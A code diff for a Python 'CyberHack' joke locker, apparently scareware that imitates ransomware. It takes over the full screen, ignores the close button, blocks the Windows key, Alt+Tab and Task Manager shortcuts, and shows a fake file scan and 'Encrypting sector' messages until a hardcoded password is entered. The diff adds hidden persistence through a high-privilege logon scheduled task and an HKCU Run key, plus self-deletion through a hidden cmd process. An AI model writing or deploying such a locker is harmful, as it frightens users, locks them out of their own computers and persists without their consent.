@@ -1,5 +1,7 @@
 # -*- coding: utf-8 -*-
-import sys, os, base64, tempfile, time, threading, random, string, shutil, tkinter as tk
+import sys, os, base64, tempfile, time, random, string, shutil
+import subprocess, ctypes
+import tkinter as tk
 
 try:
     import keyboard
@@ -12,13 +14,21 @@ try:
 except ImportError:
     HAS_SOUND = False
 
+try:
+    import winreg
+    HAS_REG = True
+except ImportError:
+    HAS_REG = False
+
 PASSWORD = "123"
 MAX_ATTEMPTS = 3
 BLOCKED = ["left windows", "right windows", "alt+tab", "alt+f4",
            "ctrl+esc", "alt+esc", "ctrl+shift+esc"]
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-ERROR_LOG  = os.path.join(SCRIPT_DIR, "error.log")
+os.chdir(SCRIPT_DIR)
+
+ERROR_LOG = os.path.join(SCRIPT_DIR, "error.log")
 
 START_B64   = os.path.join(SCRIPT_DIR, "start.b64")
 SOUND_B64   = os.path.join(SCRIPT_DIR, "sound.b64")
@@ -41,25 +51,70 @@ _TEMP_WRONG   = os.path.join(tempfile.gettempdir(), "cyberhack_wrong.wav")
 DIR_SCAN_DURATION_MS = 6000
 DIR_SCAN_LINE_MS     = 1
 
+APP_NAME  = "CyberHack"
+RUN_KEY   = r"Software\Microsoft\Windows\CurrentVersion\Run"
+TASK_NAME = "CyberHackLocker"
+MUTEX     = "Global\\CyberHackJokeMutex"
+
 FAKE_EXTENSIONS = [".txt", ".docx", ".jpg", ".png", ".mp4", ".exe", ".dll",
                    ".ini", ".log", ".cfg", ".pdf", ".zip", ".py", ".json"]
 
 
-def random_filename():
-    length = random.randint(190, 200)
-    name = "".join(random.choices(string.ascii_letters + string.digits, k=length))
-    ext = random.choice(FAKE_EXTENSIONS)
-    return name + ext
+# ----------------------------- АВТОЗАПУСК -----------------------------
+
+def _pyw_path():
+    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+    return pyw if os.path.exists(pyw) else sys.executable
 
 
-def random_size():
-    return f"{random.randint(1, 999_999):,}".replace(",", " ")
+def install_autostart():
+    """Планировщик + HKCU Run, напрямую pythonw.exe, без cmd."""
+    pyw = _pyw_path()
+    script = os.path.abspath(__file__)
+    tr = f'"{pyw}" "{script}"'
+
+    # 1) Планировщик: /it (в сессии юзера), /delay 10 с, скрытое окно
+    try:
+        subprocess.run(
+            ["schtasks", "/create", "/tn", TASK_NAME,
+             "/tr", tr, "/sc", "onlogon",
+             "/delay", "0000:10", "/rl", "highest", "/it", "/f"],
+            capture_output=True, creationflags=0x08000000,
+        )
+    except Exception:
+        pass
+
+    # 2) HKCU Run (fallback)
+    if HAS_REG:
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
+                                winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, APP_NAME, 0, winreg.REG_SZ, tr)
+        except Exception:
+            pass
 
 
-def fake_dir_line():
-    date = f"{random.randint(1,28):02d}.{random.randint(1,12):02d}.{random.randint(2018,2025)}"
-    tm   = f"{random.randint(0,23):02d}:{random.randint(0,59):02d}"
-    return f"{date}  {tm}    {random_size():>12} {random_filename()}"
+def remove_autostart():
+    if HAS_REG:
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
+                                winreg.KEY_SET_VALUE) as k:
+                winreg.DeleteValue(k, APP_NAME)
+        except Exception:
+            pass
+    try:
+        subprocess.run(["schtasks", "/delete", "/tn", TASK_NAME, "/f"],
+                       capture_output=True, creationflags=0x08000000)
+    except Exception:
+        pass
+
+
+def already_running():
+    try:
+        ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX)
+        return ctypes.windll.kernel32.GetLastError() == 183
+    except Exception:
+        return False
 
 
 # ----------------------------- ЗВУК -----------------------------
@@ -98,34 +153,11 @@ def _decode_b64_to_wav(src, dst):
         return None
 
 
-def prepare_start():
-    if os.path.exists(START_WAV):
-        return START_WAV
-    return _decode_b64_to_wav(START_B64, _TEMP_START)
-
-
-def prepare_sound():
-    if os.path.exists(SOUND_WAV):
-        return SOUND_WAV
-    return _decode_b64_to_wav(SOUND_B64, _TEMP_SOUND)
-
-
-def prepare_voice():
-    if os.path.exists(VOICE_WAV):
-        return VOICE_WAV
-    return _decode_b64_to_wav(VOICE_B64, _TEMP_VOICE)
-
-
-def prepare_correct():
-    if os.path.exists(CORRECT_WAV):
-        return CORRECT_WAV
-    return _decode_b64_to_wav(CORRECT_B64, _TEMP_CORRECT)
-
-
-def prepare_wrong():
-    if os.path.exists(WRONG_WAV):
-        return WRONG_WAV
-    return _decode_b64_to_wav(WRONG_B64, _TEMP_WRONG)
+def prepare_start():    return START_WAV if os.path.exists(START_WAV)   else _decode_b64_to_wav(START_B64,   _TEMP_START)
+def prepare_sound():    return SOUND_WAV if os.path.exists(SOUND_WAV)   else _decode_b64_to_wav(SOUND_B64,   _TEMP_SOUND)
+def prepare_voice():    return VOICE_WAV if os.path.exists(VOICE_WAV)   else _decode_b64_to_wav(VOICE_B64,   _TEMP_VOICE)
+def prepare_correct():  return CORRECT_WAV if os.path.exists(CORRECT_WAV) else _decode_b64_to_wav(CORRECT_B64, _TEMP_CORRECT)
+def prepare_wrong():    return WRONG_WAV if os.path.exists(WRONG_WAV)   else _decode_b64_to_wav(WRONG_B64,   _TEMP_WRONG)
 
 
 def _play(path):
@@ -137,24 +169,11 @@ def _play(path):
         pass
 
 
-def play_start():
-    _play(prepare_start())
-
-
-def play_sound():
-    _play(prepare_sound())
-
-
-def play_voice():
-    _play(prepare_voice())
-
-
-def play_correct():
-    _play(prepare_correct())
-
-
-def play_wrong():
-    _play(prepare_wrong())
+def play_start():   _play(prepare_start())
+def play_sound():   _play(prepare_sound())
+def play_voice():   _play(prepare_voice())
+def play_correct(): _play(prepare_correct())
+def play_wrong():   _play(prepare_wrong())
 
 
 def stop_all_sounds():
@@ -198,24 +217,21 @@ def unblock_keys():
 # ----------------------------- ОЧИСТКА -----------------------------
 
 def _remove_self_file(path):
-    """Удаляет файл через отдельный cmd-процесс (обход блокировки запущенного файла)."""
     try:
         if os.path.exists(path):
             subprocess.Popen(
                 ["cmd", "/c", "del", "/f", "/q", path],
-                shell=False,
-                creationflags=0x08000000,  # CREATE_NO_WINDOW
+                shell=False, creationflags=0x08000000,
             )
     except Exception:
         pass
 
 
 def cleanup_all():
-    """Стирает ВСЁ. Вызывается только при правильном ключе или Ctrl+C."""
     stop_all_sounds()
     unblock_keys()
+    remove_autostart()
 
-    # 1. Файлы в C:\CyberHack
     for f in (START_B64, SOUND_B64, VOICE_B64, CORRECT_B64, WRONG_B64,
               START_WAV, SOUND_WAV, VOICE_WAV, CORRECT_WAV, WRONG_WAV):
         try:
@@ -223,42 +239,51 @@ def cleanup_all():
         except Exception:
             pass
 
-    # 2. Временные WAV
     for f in (_TEMP_START, _TEMP_SOUND, _TEMP_VOICE, _TEMP_CORRECT, _TEMP_WRONG):
         try:
             os.remove(f)
         except Exception:
             pass
 
-    # 3. key.txt
     try:
         os.remove(os.path.join(SCRIPT_DIR, "key.txt"))
     except Exception:
         pass
 
-    # 4. Автозагрузка (через отдельный процесс, т.к. файл может быть запущен)
     try:
         startup = os.path.join(
             os.environ.get("APPDATA", ""),
             r"Microsoft\Windows\Start Menu\Programs\Startup\cyberhack_check.bat",
         )
         if os.path.exists(startup):
-            subprocess.Popen(
-                ["cmd", "/c", "del", "/f", "/q", startup],
-                shell=False,
-                creationflags=0x08000000,
-            )
+            _remove_self_file(startup)
     except Exception:
         pass
 
-    # 5. Себя (Locker.py) — через отдельный процесс
     _remove_self_file(os.path.abspath(__file__))
 
-    # 6. Папка C:\CyberHack
     try:
         shutil.rmtree(SCRIPT_DIR, ignore_errors=True)
     except Exception:
         pass
+
+
+# ----------------------------- dir /s -----------------------------
+
+def random_filename():
+    n = random.randint(190, 200)
+    name = "".join(random.choices(string.ascii_letters + string.digits, k=n))
+    return name + random.choice(FAKE_EXTENSIONS)
+
+
+def random_size():
+    return f"{random.randint(1, 999_999):,}".replace(",", " ")
+
+
+def fake_dir_line():
+    date = f"{random.randint(1,28):02d}.{random.randint(1,12):02d}.{random.randint(2018,2025)}"
+    tm   = f"{random.randint(0,23):02d}:{random.randint(0,59):02d}"
+    return f"{date}  {tm}    {random_size():>12} {random_filename()}"
 
 
 # ----------------------------- ASCII -----------------------------
@@ -294,6 +319,7 @@ class Locker:
         self.root.geometry(f"{sw}x{sh}+0+0")
         self.root.attributes("-topmost", True)
         self.root.configure(bg="black")
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
 
         self.attempts   = 0
         self.stop_flag  = False
@@ -309,20 +335,15 @@ class Locker:
         self.root.after(9000, self._show_password_ui)
 
     def _show_red(self):
-        if self._pwd_shown:
-            return
-        for w in self.root.winfo_children():
-            w.destroy()
+        if self._pwd_shown: return
+        for w in self.root.winfo_children(): w.destroy()
         self.red = tk.Frame(self.root, bg="#7a0000")
         self.red.pack(fill=tk.BOTH, expand=True)
         play_sound()
 
     def _start_dir_scan(self):
-        if self._pwd_shown:
-            return
-        for w in self.root.winfo_children():
-            w.destroy()
-
+        if self._pwd_shown: return
+        for w in self.root.winfo_children(): w.destroy()
         play_voice()
 
         self.text_widget = tk.Text(
@@ -349,21 +370,17 @@ class Locker:
             pass
 
     def _scan_tick(self):
-        if self._pwd_shown:
-            return
-        if self._scan_elapsed >= DIR_SCAN_DURATION_MS:
-            return
+        if self._pwd_shown: return
+        if self._scan_elapsed >= DIR_SCAN_DURATION_MS: return
         self._append_line(fake_dir_line())
         self._scan_elapsed += DIR_SCAN_LINE_MS
         self.root.after(DIR_SCAN_LINE_MS, self._scan_tick)
 
     def _show_password_ui(self):
-        if self._pwd_shown:
-            return
+        if self._pwd_shown: return
         self._pwd_shown = True
 
-        for w in self.root.winfo_children():
-            w.destroy()
+        for w in self.root.winfo_children(): w.destroy()
         self.root.configure(bg="black")
 
         self.text = tk.Text(
@@ -402,13 +419,10 @@ class Locker:
         self._tick_sector()
 
     def _tick_sector(self):
-        if self.stop_flag:
-            return
+        if self.stop_flag: return
         self.sector += 1
         try:
-            self.progress_label.config(
-                text=f"Encrypting sector {self.sector}..."
-            )
+            self.progress_label.config(text=f"Encrypting sector {self.sector}...")
         except tk.TclError:
             return
         self.root.after(100, self._tick_sector)
@@ -491,7 +505,25 @@ class Locker:
         self.root.mainloop()
 
 
+# ----------------------------- MAIN -----------------------------
+
+def _log_crash():
+    import traceback
+    try:
+        with open(ERROR_LOG, "w", encoding="utf-8") as f:
+            f.write(traceback.format_exc())
+    except Exception:
+        pass
+
+
 if __name__ == "__main__":
+    if "--install" in sys.argv:
+        install_autostart()
+        sys.exit(0)
+
+    if already_running():
+        sys.exit(0)
+
     try:
         Locker().run()
     except KeyboardInterrupt:
@@ -500,12 +532,7 @@ if __name__ == "__main__":
         cleanup_all()
         sys.exit(0)
     except Exception:
-        import traceback
-        try:
-            with open(ERROR_LOG, "w", encoding="utf-8") as f:
-                f.write(traceback.format_exc())
-        except Exception:
-            pass
+        _log_crash()
         cleanup_all()
         raise
     finally:
